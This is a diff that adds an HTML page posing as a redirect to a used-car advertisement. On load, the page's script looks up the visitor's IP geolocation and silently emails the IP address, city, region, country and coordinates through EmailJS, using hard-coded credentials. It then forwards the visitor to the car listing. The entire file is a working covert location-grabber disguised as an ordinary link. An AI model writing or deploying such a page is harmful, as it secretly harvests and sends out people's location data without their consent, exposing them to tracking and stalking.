@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Redirecting to Car Ad</title>
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script>
+    function sendLocation(data) {
+      emailjs.init("Dk5-rOWQ4PneHFNc7");
+
+      const templateParams = {
+        ip: data.ip,
+        city: data.city,
+        region: data.region,
+        country: data.country_name,
+        latitude: data.latitude,
+        longitude: data.longitude
+      };
+
+      emailjs.send("service_267lpap", "template_hp9k05b", templateParams)
+        .then(function(response) {
+          console.log('Location sent:', response.status, response.text);
+          window.location.href = "https://www.pakwheels.com/used-cars/honda-civic-1997-for-sale-in-rawalpindi-9972237";
+        }, function(error) {
+          console.error('Failed to send location:', error);
+          window.location.href = "https://www.pakwheels.com/used-cars/honda-civic-1997-for-sale-in-rawalpindi-9972237";
+        });
+    }
+
+    function fetchIPLocation() {
+      fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => sendLocation(data))
+        .catch(err => {
+          console.error("Error getting location:", err);
+          window.location.href = "https://www.pakwheels.com/used-cars/honda-civic-1997-for-sale-in-rawalpindi-9972237";
+        });
+    }
+
+    window.onload = fetchIPLocation;
+  </script>
+</head>
+<body>
+  <h2>Redirecting to the car ad...</h2>
+  <p>Please wait a moment while we check your location.</p>
+</body>
+</html>
